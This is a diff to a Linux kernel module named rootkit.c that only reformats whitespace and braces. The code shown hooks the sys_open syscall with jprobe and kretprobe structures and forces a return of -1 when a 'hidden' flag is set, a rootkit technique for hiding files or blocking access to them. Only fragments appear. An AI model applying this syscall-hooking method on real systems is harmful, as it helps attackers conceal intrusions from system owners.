@@ -1,5 +1,5 @@
 /*
- * rootkit.c - Thomas Moussajee 
+ * rootkit.c - Thomas Moussajee
  */
 
 #include <linux/init.h>
@@ -9,7 +9,7 @@
 #include <linux/syscalls.h>
 #include <asm/uaccess.h>
 #include <asm/cacheflush.h>
-#include <linux/delay.h> 
+#include <linux/delay.h>
 #include <linux/fcntl.h>
 #include <linux/kprobes.h>
 #include <asm/uaccess.h>
@@ -34,25 +34,25 @@ asmlinkage long new_sys_open(const char __user *filename, int flags, umode_t mod
 
 static int open_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	if (hidden)
-	  regs->ax = -1;
-
-	return 0;
+        if (hidden)
+        {
+            regs->ax = -1;
+        }
+        return 0;
 }
-      
-static struct jprobe my_jprobe =
-	{
-	  .entry= new_sys_open,
-	  .kp = {
-	    .symbol_name = "sys_open",
-	  },
-	};
+
+static struct jprobe my_jprobe = {
+        .entry= new_sys_open,
+        .kp = {
+        .symbol_name = "sys_open",
+    },
+};
 
 static struct kretprobe mprotect_kretprobe =
-	  {
-	    .handler = open_ret_handler,
-	    .maxactive = 100
-	  };
+    {
+        .handler = open_ret_handler,
+        .maxactive = 100
+    };
 
 
 int init_module(void)
